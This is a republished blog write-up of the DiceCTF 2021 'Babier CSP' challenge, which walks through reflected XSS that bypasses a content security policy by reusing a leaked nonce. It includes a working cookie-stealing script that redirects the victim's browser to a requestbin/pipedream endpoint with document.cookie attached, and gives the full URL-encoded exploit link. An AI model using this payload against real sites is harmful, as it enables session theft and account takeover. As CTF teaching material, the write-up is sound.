# :globe_with_meridians: Babier CSP: A Great beginner XSS challenge

> **Original Source:** [Babier CSP: A Great beginner XSS challenge](https://0x0elliot.medium.com/babier-csp-a-great-beginner-xss-challenge-c8b431c03385)
> **Platform:** 0x0elliot.medium.com | **Category:** `WEB`
...
I had some time this weekend so i decided to play [DiceCTF 2021](https://ctftime.org/event/1236). Babier CSP was a CTF i encountered. On first look, it’s your average XSS challenge with an addition of checking the nonce. Don’t let the word “nonce” scare you. I will try my best to simplify this challenge for you.
...
Injecting malicious javascript code into a web page is termed as “Cross Site Scripting” often called “XSS”. You can pretty much make a user’s browser execute any function and it will seem like they executed it. This way, you can even steal their cookies and thus take over their account. That is of course, if the target website is vulnerable to XSS. You can learn more about it [here](https://www.youtube.com/watch?v=L5l9lSnNMxg).
...
The form of XSS that we are using is called Reflected XSS. You can learn about types of XSS [here](https://portswigger.net/web-security/cross-site-scripting).


In reflected XSS, you can send a link to the victim and the link itself contains the payload that gets executed. For example, [https://babier-csp.dicec.tf/?name=%3C/h1%3E%3Cscript%20nonce=LRGWAXOY98Es0zz0QOVmag==%3Ealert(1)%3C/script%3E%3C!--](https://babier-csp.dicec.tf/?name=%3C%2Fh1%3E%3Cscript+nonce%3DLRGWAXOY98Es0zz0QOVmag%3D%3D%3Ealert%281%29%3C%2Fscript%3E%3C%21--) how this link itself has our payload and it’s not stored anywhere. It gets executed because it reflects the parameters in the link.


Anyway, back to stealing cookies and clapping some cheeks.


Usually you need a server to steal cookies with XSS but [https://requestbin.com/](https://requestbin.com/) makes your life so much easier by assigning you an endpoint you can send requests to and see the request details.
...
```
<script>
document.location= "[https://envn9mg1xs9204g.m.pipedream.net](https://envn9mg1xs9204g.m.pipedream.net)/?cookie=" + document.cookie
</script>
```
...
[https://babier-csp.dicec.tf/?name=%3C/h1%3E%3Cscript%20nonce=LRGWAXOY98Es0zz0QOVmag==%3E%20document.location=%20%22https://envn9mg1xs9204g.m.pipedream.net/?cookie=%22%20%2B%20document.cookie%20%3C/script%3E](https://babier-csp.dicec.tf/?name=%3C%2Fh1%3E%3Cscript+nonce%3DLRGWAXOY98Es0zz0QOVmag%3D%3D%3E+document.location%3D+%22https%3A%2F%2Fenvn9mg1xs9204g.m.pipedream.net%2F%3Fcookie%3D%22+%2B+document.cookie+%3C%2Fscript%3E)


Great. Also heads up, remember that links have their respective encoding. If things screw up, Just replace the “+” you used in the code with “[%2B](https://babier-csp.dicec.tf/?name=%3C%2Fh1%3E%3Cscript+nonce%3DLRGWAXOY98Es0zz0QOVmag%3D%3D%3E+document.location%3D+%22https%3A%2F%2Fenvn9mg1xs9204g.m.pipedream.net%2F%3Fcookie%3D%22+%2B+document.cookie+%3C%2Fscript%3E)” like i did or it will be considered a space instead.
...
If you liked the article, then feel free to follow me on [twitter](https://twitter.com/0x0elliot) here. Feel free to drop some feedback there as well. Be kind while giving the feedback :>
I also run a community of hackers on discord. Here is the invite link to it: [https://discord.gg/hyrSjqWXyH](https://discord.gg/hyrSjqWXyH)
...
*Originally published on [Medium](https://0x0elliot.medium.com/babier-csp-a-great-beginner-xss-challenge-c8b431c03385). All credit goes to the original author.*
